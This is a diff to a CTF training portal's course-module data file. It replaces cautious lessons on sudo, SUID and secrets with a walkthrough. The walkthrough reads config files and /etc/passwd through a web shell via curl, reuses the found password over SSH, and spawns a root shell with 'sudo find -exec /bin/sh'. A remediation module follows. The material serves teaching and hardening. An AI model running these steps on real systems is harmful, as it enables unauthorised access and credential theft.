   },
+
+  // -------------------------------------------------------------------------
+  // Module 6: Credential Harvesting & Lateral Movement
+  // -------------------------------------------------------------------------
   {
-    id: 'sudo', track: 'boundaries', title: 'Sudo policy', minutes: 14,
-    objective: 'Read sudo rules as policy bound to a user, host, run-as identity, executable, arguments, and environment.',
-    intro: 'NOPASSWD does not automatically mean a root shell. Risk comes from the allowed binary, controllable arguments, environment, and file dependencies.',
-    outcomes: ['Translate `sudo -l` output into rule fields.', 'Recognize wildcards, interpreters, editors, pagers, archive tools, and SETENV as leads.', 'Propose least-privilege remediation.'],
-    sections: [
-      { id: 'read', title: 'Read effective policy first', commands: [
-        { label: 'List current policy', value: 'sudo -l', explanation: 'Shows commands the current user may run and the run-as identity.', lookFor: 'NOPASSWD, exact paths, wildcards, arguments, SETENV, and target user.', output: '(root) NOPASSWD: /usr/local/bin/backup --source /opt/ctf' },
-        { label: 'Version and build context', value: 'sudo -V | head -n 12', explanation: 'Use this as context. Never choose an exploit from a version string alone.', lookFor: 'Policy plugin and environment behavior relevant to the candidate.' },
-      ] },
-      { id: 'interpret', title: 'Translate the rule', paragraphs: ['In the example, the invoking user is the current user, run-as is root, the executable must be that exact path, and arguments are limited to `--source /opt/ctf`. Next ask whether the executable or data under `/opt/ctf` can influence the privileged operation.'], bullets: ['Is the executable a writable script?', 'Does a wildcard expand to user-controlled files?', 'Does the binary have shell, editor, pager, plugin, or command-execution behavior?', 'Can the environment change a library, interpreter, PATH, or configuration?'] },
-      { id: 'validate', title: 'Safe validation boundary', paragraphs: ['Use only the challenge fixture and stop when the intended identity or flag is proven. Do not edit `/etc/sudoers` or try random commands.'], callout: { kind: 'danger', title: 'Do not “try sudo”', text: 'Do not run `sudo -i`, `sudo su`, `sudo bash`, or a shell escape just to see whether it works. Understand the rule before using it.' } },
+    id: 'credential-harvesting',
+    track: 'lateral-privesc',
+    title: 'Credential Harvesting & Lateral Movement to SSH',
+    minutes: 15,
+    objective: 'Locate plaintext credentials in web application config files and test them against other services on the system.',
+    intro: 'Web applications need database credentials to function, and those credentials live somewhere on disk. PHP config files under the web root are common hiding spots. The bigger problem is credential reuse - the same password found in a config file often works for SSH or other local accounts.',
+    outcomes: [
+      'Search the web root for configuration files containing hardcoded credentials.',
+      'Cross-reference discovered usernames against system accounts.',
+      'Test credential reuse against SSH.',
     ],
-    mistakes: ['Focusing on NOPASSWD while ignoring arguments.', 'Assuming every allowed binary has a shell escape.', 'Changing sudoers or environment policy.', 'Running a public exploit without mapping the rule.'],
-    checkpoint: { prompt: 'Describe one sudo rule.', tasks: ['Invoking user.', 'Run-as user/group.', 'Exact executable and arguments.', 'Controlled input.', 'Least-privilege remediation.'] },
-    references: [refs.sudoers, refs.mitreSudo],
+    sections: [
+      {
+        id: 'inspecting-configs',
+        title: 'Finding hardcoded credentials',
+        paragraphs: [
+          'From your web shell, read configuration files in the web root. PHP apps commonly store connection parameters in files named `db_config.php`, `config.php`, `.env`, or similar. Look for variables holding usernames and passwords.',
+        ],
+        commands: [
+          {
+            label: 'Read a config file via webshell',
+            value: 'curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/var/www/html/<config_file>"',
+            explanation: 'Use your web shell to read the contents of a configuration file on the server.',
+            lookFor: 'Variables holding usernames and passwords, especially for database connections.',
+          },
+          {
+            label: 'Enumerate system accounts',
+            value: 'curl "http://<TARGET_IP>/<shell_path>?cmd=cat+/etc/passwd"',
+            explanation: 'Read the system user list to find accounts with interactive login shells.',
+            lookFor: 'Entries ending in `/bin/bash` or `/bin/sh` - those are accounts you can potentially SSH into.',
+          },
+        ],
+      },
+      {
+        id: 'ssh-pivot',
+        title: 'Pivoting to SSH',
+        paragraphs: [
+          'Compare the username in the config file against the system account list. If there is a match, try the password against SSH. Credential reuse between application accounts and system accounts is extremely common.',
+        ],
+        commands: [
+          {
+            label: 'SSH login attempt',
+            value: 'ssh <username>@<TARGET_IP>',
+            explanation: 'Attempt an interactive login using the credentials you discovered.',
+            lookFor: 'A shell prompt - this confirms successful lateral movement to an interactive account.',
+          },
+          {
+            label: 'Check the home directory',
+            value: 'ls ~ && cat ~/user.txt',
+            explanation: 'Look for the user flag file in the home directory.',
+            lookFor: 'A file containing a value in `EH{...}` format.',
+          },
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Flag 1 (User Flag)',
+          text: 'Submit the value found in `~/user.txt` to Challenge 1 ("User Flag") in the CTF portal. To finish the competition, proceed to Module 07 for the privilege escalation path to the root flag.',
+        },
+      },
+    ],
+    mistakes: [
+      'Staying in the limited webshell when SSH gives a far more stable session.',
+      'Only checking obvious config filenames - look for `.bak` files and hidden dotfiles too.',
+      'Assuming credentials are unique to one service.',
+    ],
+    checkpoint: {
+      prompt: 'Verify lateral movement to a system account.',
+      tasks: [
+        'Locate a configuration file containing hardcoded credentials.',
+        'Identify a system account matching the discovered username.',
+        'Attempt SSH login with the reused credentials and check the home directory for Flag 1.',
+        'Proceed to Module 07 to escalate to root.',
+      ],
+    },
+    references: [refs.ssh, refs.mitreSecrets],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 7: Sudo Privilege Escalation to Root Flag
+  // -------------------------------------------------------------------------
   {
-    id: 'suid-sgid', track: 'boundaries', title: 'SUID and SGID', minutes: 14,
-    objective: 'Separate a special mode bit from a vulnerability and assess a privileged executable’s input boundary.',
-    intro: 'When SUID or SGID applies to an executable, effective identity can change during `execve`. A standard binary is not automatically vulnerable; focus on custom lab behavior and its inputs, files, environment, and commands.',
-    outcomes: ['Find SUID and SGID files within a bounded scope.', 'Read `s` and octal 4000/2000.', 'Separate special bits, program behavior, and exploitability.'],
-    sections: [
-      { id: 'discover', title: 'Discover and classify', commands: [
-        { label: 'SUID executables', value: "find /usr /bin /sbin /opt -xdev -type f -perm -4000 -printf '%m %u %g %p\\n' 2>/dev/null", explanation: '`-perm -4000` requires SUID; output records mode, owner, group, and path.', lookFor: 'Custom binaries under /usr/local or /opt owned by root.' },
-        { label: 'SGID executables', value: "find /usr /bin /sbin /opt -xdev -type f -perm -2000 -printf '%m %u %g %p\\n' 2>/dev/null", explanation: 'SGID can provide the file owner’s effective group.', lookFor: 'A binary that reaches a group-sensitive resource.' },
-        { label: 'Inspect a candidate', value: "stat -c '%A %a %U %G %n' /usr/local/bin/ctf-helper\nstrings -a -n 6 /usr/local/bin/ctf-helper | head -n 40", explanation: '`strings` is a clue for paths and messages, not a replacement for source review or proof.', lookFor: 'Relative commands, temporary paths, configuration names, or user-controlled input.', output: '-rwsr-xr-x 4755 root root /usr/local/bin/ctf-helper' },
-      ] },
-      { id: 'reason', title: 'Reason about the transition', paragraphs: ['Document identity before execution, file owner/mode, expected effective identity, input boundary, and output proving the intended path. Do not execute an unknown binary with arbitrary input.'] },
-      { id: 'harden', title: 'Hardening direction', bullets: ['Remove the special bit when it is not required.', 'Separate privileged operations into a minimal helper.', 'Use absolute paths and a sanitized environment.', 'Validate input and avoid unsafe temporary files.'] },
+    id: 'sudo-privesc-find',
+    track: 'lateral-privesc',
+    title: 'Privilege Escalation via Sudo Find (Root Flag & GTFOBins)',
+    minutes: 15,
+    objective: 'Audit sudo privileges on the compromised account, leverage GTFOBins binary execution to spawn a root shell, and capture the final root flag.',
+    intro: 'After obtaining access as an unprivileged user, your final objective is complete system compromise (root). Linux sudo configurations often grant specific utility binaries NOPASSWD execution rights. Many of these utilities support command execution flags that can be abused to break out into a full root shell.',
+    outcomes: [
+      'Enumerate permitted sudo commands using `sudo -l`.',
+      'Identify binaries with shell breakout capabilities using GTFOBins.',
+      'Execute a privileged shell to obtain root access and retrieve Flag 2.',
     ],
-    mistakes: ['Assuming every SUID entry is exploitable.', 'Running an unknown binary with arbitrary input.', 'Changing a bit or copying a binary out of the lab.', 'Failing to compare a standard binary with the challenge binary.'],
-    checkpoint: { prompt: 'Compare two binaries.', tasks: ['Choose one standard SUID and one custom lab binary.', 'Record purpose, owner, mode, and input.', 'Explain why one is a candidate.', 'Name the minimum permitted proof.'] },
-    references: [refs.inode, refs.execve, refs.credentials, refs.mitreSuid],
+    diagram: {
+      src: '/learn/pe-workflow.svg',
+      alt: 'Privilege escalation workflow: Sudo Audit -> GTFOBins Lookup -> Root Execution.',
+      caption: 'Leverage permitted binary functionality to transition execution into the root context.',
+    },
+    sections: [
+      {
+        id: 'sudo-audit',
+        title: 'Auditing Sudo Permissions',
+        paragraphs: [
+          'As soon as you obtain an interactive SSH shell as a standard user, check what commands you are permitted to run with elevated privileges.',
+        ],
+        commands: [
+          {
+            label: 'Enumerate sudo permissions',
+            value: 'sudo -l',
+            explanation: 'Displays the sudoers configuration entries permitted for the current user.',
+            lookFor: 'Entries marked with `NOPASSWD:` - particularly utility binaries such as `/usr/bin/find`.',
+          },
+        ],
+      },
+      {
+        id: 'gtfobins-find',
+        title: 'Abusing Binary Execution via GTFOBins',
+        paragraphs: [
+          'GTFOBins catalogs how Unix binaries can be exploited to bypass local security restrictions. When a binary like `find` is allowed in sudoers without a password, its execution parameters (such as `-exec`) can be used to run commands directly as root.',
+        ],
+        commands: [
+          {
+            label: 'Spawn interactive root shell',
+            value: 'sudo find . -exec /bin/sh \\; -quit',
+            explanation: 'Executes `/bin/sh` through find with root privileges. The `-quit` argument exits find immediately after the shell terminates.',
+            lookFor: 'The terminal prompt changes from `$` to `#`, signifying root execution context.',
+          },
+          {
+            label: 'Verify root context',
+            value: 'whoami && id',
+            explanation: 'Confirms that the active process is operating with effective root user privileges.',
+            lookFor: '`root` and `uid=0(root) gid=0(root)` in the output.',
+          },
+        ],
+      },
+      {
+        id: 'root-flag-retrieval',
+        title: 'Capturing the Root Flag',
+        paragraphs: [
+          'With root privileges established, navigate to the administrator home directory (`/root`) to retrieve the second and final competition flag.',
+        ],
+        commands: [
+          {
+            label: 'Read root flag',
+            value: 'cat /root/root.txt',
+            explanation: 'Displays the contents of the root flag file located in the `/root` directory.',
+            lookFor: 'A string starting with `EH{` representing the root flag.',
+          },
+        ],
+        callout: {
+          kind: 'good',
+          title: 'Flag 2 (Root Flag)',
+          text: 'Submit the recovered value to Challenge 2 ("Root Flag") in the CTF portal to complete the challenge.',
+        },
+      },
+    ],
+    mistakes: [
+      'Not running `sudo -l` immediately after landing on a new account.',
+      'Overlooking binaries that seem harmless without checking GTFOBins.',
+      'Failing to verify root identity before proceeding.',
+    ],
+    checkpoint: {
+      prompt: 'Confirm full root compromise.',
+      tasks: [
+        'Run `sudo -l` to discover permitted binaries.',
+        'Apply the GTFOBins execution technique to spawn a root shell.',
+        'Confirm root identity with `whoami` and `id`.',
+        'Read `/root/root.txt` and submit Flag 2 in the portal.',
+      ],
+    },
+    references: [refs.gtfobinsFind, refs.sudoers, refs.mitreSudo],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 8: Hardening & Defensive Remediation
+  // -------------------------------------------------------------------------
   {
-    id: 'capabilities', track: 'boundaries', title: 'Linux capabilities', minutes: 14,
-    objective: 'Connect a specific capability with the sensitive operation a binary actually performs.',
-    intro: 'Capabilities divide traditional root privilege into smaller units. A file capability is not “root”; its impact depends on the effective set, bounding rules, user namespace, and program behavior.',
-    outcomes: ['Find file capabilities.', 'Distinguish permitted, effective, inheritable, bounding, and ambient context.', 'Assess whether a capability is relevant to the intended operation.'],
-    sections: [
-      { id: 'discover', title: 'File and process capability', commands: [
-        { label: 'Bounded file capability search', value: 'getcap -r /usr /bin /sbin /opt 2>/dev/null', explanation: 'Search for extended capability attributes in relevant directories.', lookFor: 'A custom binary with cap_setuid, cap_dac_read_search, cap_dac_override, or another challenge-relevant capability.', output: '/opt/ctf/reader cap_dac_read_search=ep' },
-        { label: 'Inspect one file', value: 'getcap /opt/ctf/reader', explanation: 'Confirm a specific candidate after the search.', lookFor: '`e` means effective and `p` means permitted in file-capability notation.' },
-        { label: 'Inspect one running process', value: "grep -E '^(CapInh|CapPrm|CapEff|CapBnd|CapAmb):' /proc/<PID>/status", explanation: 'Process capability masks are hexadecimal and must be interpreted with the capability list.', lookFor: 'The capability that is actually effective after the binary starts.' },
-      ] },
-      { id: 'interpret', title: 'A capability is a verb', paragraphs: ['Ask what operation the capability permits. `CAP_DAC_READ_SEARCH` relates to bypassing read/search checks; `CAP_SETUID` allows UID changes; `CAP_SYS_ADMIN` is broad. Then ask whether the binary gives the user a reachable way to perform that operation.'] },
-      { id: 'boundary', title: 'Lab-safe boundary', paragraphs: ['Prove only the file or identity specified by the challenge. Do not read unrelated private data, run `setcap`, or copy a capability to another binary.'], callout: { kind: 'info', title: 'Capability ≠ root', text: 'State the capability, operation, binary behavior, and scoped object. Without all four, the conclusion is incomplete.' } },
+    id: 'remediation-hardening',
+    track: 'remediation',
+    title: 'Defensive Remediation & Infrastructure Hardening',
+    minutes: 14,
+    objective: 'Apply least-privilege principles, secure configurations, and defensive controls to fix every vulnerability in the attack chain.',
+    intro: 'An attack path is only as useful as the defense it inspires. Understanding how the ExamCorp server was breached enables system administrators and developers to patch the root causes across all layers.',
+    outcomes: [
+      'Disable anonymous access in vsftpd configuration.',
+      'Refactor dynamic SQL queries to use secure PDO prepared statements.',
+      'Harden file upload endpoints against web shell execution.',
+      'Apply least-privilege principles to sudoers configuration.',
     ],
-    mistakes: ['Treating any capability as equivalent to root.', 'Ignoring the bounding or effective set.', 'Using setcap during enumeration.', 'Accessing unrelated data because a capability makes it possible.'],
-    checkpoint: { prompt: 'Write a capability statement.', tasks: ['Capability name.', 'Permitted operation.', 'Binary that owns it.', 'Scoped object.', 'Proof that the code path is reachable.'] },
-    references: [refs.capabilities, refs.kernelCredentials],
-  },
-  {
-    id: 'writable-paths', track: 'boundaries', title: 'Writable paths and command resolution', minutes: 15,
-    objective: 'Analyze scripts, PATH, working directories, symlinks, and helper dependencies used by privileged execution.',
-    intro: 'A weak boundary appears when a privileged process trusts data controlled by a lower-privileged user. Control may be in a script, parent directory, sourced configuration, relative command, PATH entry, or temporary file.',
-    outcomes: ['Trace command resolution.', 'Analyze the complete trust chain.', 'Recommend absolute paths and a controlled environment.'],
     sections: [
-      { id: 'resolution', title: 'Resolve before testing', commands: [
-        { label: 'Current shell resolution', value: "printf '%s\\n' \"$PATH\"\ncommand -v <command>\ntype -a <command>", explanation: '`command -v` shows the shell’s choice; `type -a` shows every match.', lookFor: 'A writable directory that appears before trusted system directories.' },
-        { label: 'Path component ownership', value: "namei -l /path/to/script\nstat -c '%A %a %U %G %n' /path/to/script /path/to/parent", explanation: 'Check both file and directory; a writable directory may allow replacement even when the file is read-only.', lookFor: 'Current user/group control over a component used by a privileged process.' },
-        { label: 'Inspect assignments', value: "grep -nE '(^|[[:space:]])(PATH|[A-Za-z_][A-Za-z0-9_]*)=' /path/to/script 2>/dev/null", explanation: 'Find variable assignments as a clue without running the script.', lookFor: 'Relative commands, sourced configuration, custom PATH, and uncontrolled filenames.' },
-      ] },
-      { id: 'chain', title: 'Trust-chain questions', bullets: ['Who triggers the execution?', 'Which user/group runs the process?', 'Which executable or interpreter is called?', 'Is the path absolute?', 'Which dependency is user-controlled?', 'What is the smallest proof that will not damage the target?'] },
-      { id: 'boundary', title: 'Do not create the hijack during enumeration', paragraphs: ['Do not create a fake executable, replace a script, modify a symlink, or change a service environment unless the challenge provides an explicitly inert fixture. A weak trust condition can be reported without changing state.'] },
+      {
+        id: 'ftp-fix',
+        title: '1. Hardening FTP configuration',
+        paragraphs: [
+          'In `/etc/vsftpd.conf`, anonymous access should always be disabled unless strictly required by public distribution requirements.',
+        ],
+        commands: [
+          {
+            label: 'Disable anonymous FTP in vsftpd.conf',
+            value: 'sudo sed -i \'s/anonymous_enable=YES/anonymous_enable=NO/g\' /etc/vsftpd.conf\nsudo systemctl restart vsftpd',
+            explanation: 'Disables anonymous authentication and restarts the daemon.',
+            lookFor: '`anonymous_enable=NO` in `/etc/vsftpd.conf`.',
+          },
+        ],
+      },
+      {
+        id: 'sqli-fix',
+        title: '2. Remediating SQL injection with Prepared Statements',
+        paragraphs: [
+          'Replace vulnerable string concatenation with parameterized SQL queries using PHP PDO:',
+        ],
+        commands: [
+          {
+            label: 'Secure PDO authentication pattern',
+            value: '$stmt = $pdo->prepare("SELECT id, username, password FROM users WHERE username = :user");\n$stmt->execute([\'user\' => $username]);\n$user = $stmt->fetch();\nif ($user && password_verify($password, $user[\'password\'])) {\n    // Login successful\n}',
+            explanation: 'Parameters are sent separately from query logic, preventing SQL injection completely.',
+            lookFor: 'Use of `prepare()` and `password_verify()`.',
+          },
+        ],
+      },
+      {
+        id: 'upload-fix',
+        title: '3. Protecting file upload directories',
+        paragraphs: [
+          'Never permit script execution in directories where uploaded files are stored. In Apache, disable the PHP engine for `/uploads` in `.htaccess` or virtual host configuration:',
+        ],
+        commands: [
+          {
+            label: 'Disable PHP engine in uploads directory',
+            value: '# /var/www/html/uploads/.htaccess\n<FilesMatch "\\.(php|phtml|php3|php4|php5|php7|phps)$">\n    SetHandler None\n    Require all denied\n</FilesMatch>\nphp_flag engine off',
+            explanation: 'Prevents the web server from executing any PHP files uploaded by users.',
+            lookFor: 'Direct download or 403 Forbidden instead of code execution.',
+          },
+        ],
+      },
+      {
+        id: 'sudoers-fix',
+        title: '4. Enforcing least privilege in sudoers',
+        paragraphs: [
+          'Never grant sudo permissions to binaries that provide shell escapes or interactive execution (like `find`, `vi`, `less`, `awk`, `nmap`).',
+          'If a user only needs to search files, configure specific scripts or inspect whether root privilege is truly necessary.',
+        ],
+        commands: [
+          {
+            label: 'Safe sudoers rule',
+            value: '# Remove dangerous binary permissions:\n# examuser ALL=(root) NOPASSWD: /usr/bin/find\n\n# Replace with a specific, hardened maintenance script:\nexamuser ALL=(root) NOPASSWD: /usr/local/bin/safe_backup.sh',
+            explanation: 'Restrict sudo execution to tightly controlled, non-interactive scripts with absolute paths.',
+            lookFor: 'Clean `sudo -l` output without generic GTFOBins binaries.',
+          },
+        ],
+      },
     ],
-    mistakes: ['Checking your own shell PATH instead of the service environment.', 'Ignoring the working directory.', 'Creating a fake binary before proving privileged invocation.', 'Changing a symlink or script for “testing”.'],
-    checkpoint: { prompt: 'Trace one privileged command.', tasks: ['Trigger and execution user.', 'Exact command.', 'PATH/working directory.', 'Writable dependency.', 'Remediation with absolute paths and ownership.'] },
-    references: [refs.path, refs.mitrePath, refs.systemdExec],
-  },
-  {
-    id: 'scheduled-execution', track: 'boundaries', title: 'Cron and systemd', minutes: 16,
-    objective: 'Connect a schedule, execution identity, command, environment, and writable dependency.',
-    intro: 'A timer or cron entry name does not prove root execution. Follow the chain from trigger to service or command, then inspect the user/group and every trusted file.',
-    outcomes: ['Distinguish timer and service units.', 'Read User, Group, ExecStart, Environment, and WorkingDirectory.', 'Build a privileged scheduled-execution chain.'],
-    diagram: { src: '/learn/scheduled-trust.svg', alt: 'Trust chain for privileged cron and systemd execution.', caption: 'A finding needs both privileged execution and a dependency the user can control.' },
-    sections: [
-      { id: 'cron', title: 'Cron inventory', commands: [
-        { label: 'Read-only cron inspection', value: 'crontab -l 2>/dev/null\ncat /etc/crontab\nls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly 2>/dev/null', explanation: '`crontab -l` shows only current-user entries; system locations provide schedule context.', lookFor: 'A privileged command pointing to a challenge path or writable helper.' },
-      ] },
-      { id: 'systemd', title: 'Follow timer to service', commands: [
-        { label: 'Timer inventory', value: 'systemctl list-timers --all --no-pager', explanation: 'Shows the last/next trigger and the unit activated by each timer.', lookFor: 'The challenge timer and its corresponding service.' },
-        { label: 'Read loaded units', value: 'systemctl cat <unit>.timer\nsystemctl cat <unit>.service', explanation: 'Shows the unit and drop-ins actually loaded.', lookFor: 'OnCalendar/OnUnitActiveSec, ExecStart, drop-ins, and paths.' },
-        { label: 'Selected execution properties', value: 'systemctl show <unit>.service -p User -p Group -p ExecStart -p Environment -p WorkingDirectory', explanation: 'Limit output to the execution context that matters.', lookFor: 'Default root context, relative command, custom PATH, or writable working directory.' },
-      ] },
-      { id: 'boundary', title: 'Read, trace, stop', paragraphs: ['Do not use start, stop, restart, enable, disable, edit, or daemon-reload. Do not create a cron entry. When the chain is complete, document the requested proof and stop.'] },
+    mistakes: [
+      'Relying on client-side validation instead of backend controls.',
+      'Blacklisting specific file extensions (.php) instead of whitelisting (.png, .jpg).',
+      'Granting broad NOPASSWD sudo access for convenience.',
     ],
-    mistakes: ['Assuming a timer runs as root without reading its service.', 'Editing a unit or crontab.', 'Triggering a scheduler repeatedly.', 'Ignoring unit drop-ins and the working directory.'],
-    checkpoint: { prompt: 'Write the five-line chain.', tasks: ['Trigger.', 'Timer/cron entry.', 'Service/command.', 'User/group.', 'Writable dependency and remediation.'] },
-    references: [refs.systemdTimer, refs.systemdService, refs.systemdExec, refs.mitreCron],
-  },
-  {
-    id: 'secrets', track: 'delivery', title: 'Credentials and configuration', minutes: 13,
-    objective: 'Find relevant configuration without indiscriminate secret collection or credential reuse.',
-    intro: 'Configuration can explain a service account, database, script, or intended challenge path. Access to a file is not permission to copy all of it or try its credentials on another system.',
-    outcomes: ['Find filenames and metadata before values.', 'Apply minimum-necessary access.', 'Redact secrets in evidence.'],
-    sections: [
-      { id: 'discover', title: 'Find names before values', commands: [
-        { label: 'Configuration filenames', value: "find /home /opt /srv /var/www -xdev -type f \\( -name '.env' -o -name '*.conf' -o -name '*.ini' -o -name '*.yaml' -o -name '*.yml' -o -name '*.json' \\) -print 2>/dev/null", explanation: 'Start with filenames in challenge-relevant directories.', lookFor: 'Configuration related to the declared service or earlier hypothesis.' },
-        { label: 'Files that mention secret labels', value: "grep -RIlE '(^|[^A-Za-z])(password|passwd|secret|token|api[_-]?key|private[_-]?key)([^A-Za-z]|$)' /opt /srv /var/www 2>/dev/null", explanation: '`-I` ignores binary files and `-l` prints filenames only, not values.', lookFor: 'A narrow candidate for mentor-approved inspection.' },
-        { label: 'Prove access metadata', value: "stat -c '%A %a %U %G %n' /path/to/config", explanation: 'Record permission before opening content.', lookFor: 'Excessive read access or group exposure.' },
-      ] },
-      { id: 'handling', title: 'Handle sensitive values', paragraphs: ['If the challenge permits reading a specific file, take only the required lines. In the report, use redaction such as `db_password=REDACTED` and explain the consequence without sharing the value.'], callout: { kind: 'danger', title: 'No credential reuse', text: 'Do not try a password, token, or private key on another host, service, friend’s account, or public endpoint. Do not copy a private key into a submission.' } },
-      { id: 'harden', title: 'Hardening direction', bullets: ['Use a dedicated service account.', 'Restrict mode and group access.', 'Move secrets to a protected credential mechanism.', 'Rotate any secret that was exposed.', 'Never place secrets in process arguments or repositories.'] },
-    ],
-    mistakes: ['Searching the entire filesystem for the word password.', 'Printing a full secret to the terminal or evidence.', 'Testing credential reuse.', 'Assuming a file named id_rsa is valid or in scope.'],
-    checkpoint: { prompt: 'Document one configuration exposure.', tasks: ['Connect the file to a declared service.', 'Record mode and owner.', 'Redact the value.', 'Explain the in-scope impact.', 'Write remediation.'] },
-    references: [refs.mitreSecrets],
-  },
-  {
-    id: 'evidence', track: 'delivery', title: 'Validation, evidence, and reporting', minutes: 15,
-    objective: 'Produce a reproducible finding without sharing secrets or changing the target more than necessary.',
-    intro: 'A strong finding separates observation, interpretation, proof, impact, and remediation. The flag is a success marker; the report explains why the boundary failed.',
-    outcomes: ['Build a timestamped evidence chain.', 'Use the smallest safe proof.', 'Write specific remediation and retest steps.'],
-    diagram: { src: '/learn/evidence-chain.svg', alt: 'Evidence chain from observation to hardening.', caption: 'A reviewer should understand and repeat the observation without receiving credentials.' },
-    sections: [
-      { id: 'capture', title: 'Capture reproducible evidence', commands: [
-        { label: 'Evidence directory and identity', value: 'mkdir -p evidence\ndate -Is | tee evidence/timeline.txt\nid | tee evidence/identity.txt', explanation: 'Save only non-sensitive output in the participant-owned directory.', lookFor: 'Timestamp and identity binding the entire finding.' },
-        { label: 'Candidate metadata', value: "stat -c '%A %a %U %G %n' /path/to/candidate | tee evidence/candidate-stat.txt\nnamei -l /path/to/candidate | tee evidence/candidate-path.txt\nsha256sum /path/to/candidate | tee evidence/candidate-sha256.txt", explanation: 'Metadata and a hash support retesting without distributing content.', lookFor: 'Owner/mode/path consistent between observation and report.' },
-      ] },
-      { id: 'proof', title: 'Minimal validation pattern', bullets: ['Re-run the baseline identity.', 'Reproduce the observation with one narrow read-only command.', 'Use only a mentor-approved proof fixture.', 'Stop immediately when the flag or intended evidence appears.', 'Record changes and clean up only through the lab-specific procedure.'] },
-      { id: 'report', title: 'Finding template', commands: [
-        { label: 'One-page report structure', value: 'Finding: [short root-cause title]\nScope: [target IP / service / path]\nPrecondition: [account, group, permission]\nObservation: [command + timestamp + sanitized output]\nReasoning: [why the boundary matters]\nMinimal validation: [approved proof, stopped at flag]\nImpact: [in-scope privilege or access]\nRoot cause: [misconfiguration]\nRemediation: [specific control]\nRetest: [read-only validation]\nCleanup: [exact artifacts and status]', explanation: 'Observation is fact; reasoning explains consequence; remediation fixes the root cause.', lookFor: 'No password, token, private key, or unrelated personal data.' },
-      ] },
-    ],
-    mistakes: ['Claiming root without proof.', 'Pasting the entire terminal history.', 'Sharing secrets.', 'Fixing the target while the game is running without mentor approval.'],
-    checkpoint: { prompt: 'Turn one candidate into a finding.', tasks: ['Timestamped observation.', 'One-paragraph reasoning.', 'Minimal proof.', 'In-scope impact.', 'Remediation and retest.', 'Cleanup status.'] },
-    references: [refs.sudoers, refs.inode],
-  },
-  {
-    id: 'lab-checklist', track: 'delivery', title: 'Mini CTF lab quality gate', minutes: 12,
-    objective: 'Ensure the target is playable, safe, reviewable, and does not expose the intended solution.',
-    intro: 'A good lab does not need to be complicated. One initial foothold, one clear mentor-only PE path, stable services, and reproducible evidence are enough.',
-    outcomes: ['Check target-author readiness.', 'Check the solver flow from Kali.', 'Meet mentor review and player-facing redaction requirements.'],
-    sections: [
-      { id: 'author', title: 'Target author — Ubuntu', checklist: ['Use Ubuntu 24.04 or an image approved by the mentor.', 'Connect the target peer to WireGuard; never expose vulnerable services to the public Internet.', 'Declare at least three services that are actually available.', 'Provide an initial foothold without brute force.', 'Use one local PE path: sudo, SUID/SGID, capability, writable dependency, scheduler, or configuration.', 'Place the flag only at the intended endpoint.', 'Document the solution, evidence expectation, remediation, and cleanup for the mentor.', 'Test from a clean non-owner account.'] },
-      { id: 'solver', title: 'Solver — Kali VM/WSL', checklist: ['Connect the attacker peer from the portal.', 'Copy the target IP from Lab Space.', 'Check only declared ports.', 'Capture timestamp, identity, OS, route, and service map.', 'Enumerate identity → service → process → files/config → privilege boundary.', 'Stop when the flag is proven.', 'Save sanitized evidence.'] },
-      { id: 'review', title: 'Mentor review', checklist: ['Owner and target peer match.', 'Player view hides owner, technique, intended path, and flag location.', 'No persistence, destructive action, brute force, kernel exploit, or public exposure is required.', 'Light Check and manual retest pass.', 'The challenge can be returned with a specific revision note.', 'The hardening recommendation fixes the root cause.'] },
-      { id: 'publish', title: 'Portal flow', paragraphs: ['Recommended order: Setup Target → Build → Light Check → Player Preview → Submit for Review → mentor approval → Setup Attacker → Lab Space. Owners cannot solve their own challenge, and solver identity remains hidden.'], callout: { kind: 'info', title: 'Simple wins', text: 'One stable, explainable path is better than many uncontrolled vulnerabilities.' } },
-    ],
-    mistakes: ['Creating an unstable fake service.', 'Exposing the technique in the player description.', 'Relying on brute force or a kernel exploit.', 'Failing to test as a non-owner.'],
-    checkpoint: { prompt: 'Final pre-review gate.', tasks: ['Target connected.', 'Three services reachable.', 'Initial foothold tested.', 'PE path documented for mentors only.', 'Flag is case-sensitive.', 'Player preview is redacted.', 'Cleanup procedure is ready.'] },
-    references: [refs.wireguard],
+    checkpoint: {
+      prompt: 'Conduct a post-remediation security audit.',
+      tasks: [
+        'Verify `anonymous` FTP login is rejected with `530 Permission denied`.',
+        'Verify SQL injection bypass payloads return authentication errors.',
+        'Verify uploaded `.php` files are denied or served as plaintext without executing.',
+        'Verify `sudo -l` does not list `/usr/bin/find`.',
+      ],
+    },
+    references: [refs.owaspSqli, refs.owaspUpload, refs.sudoers],
   },
 ];
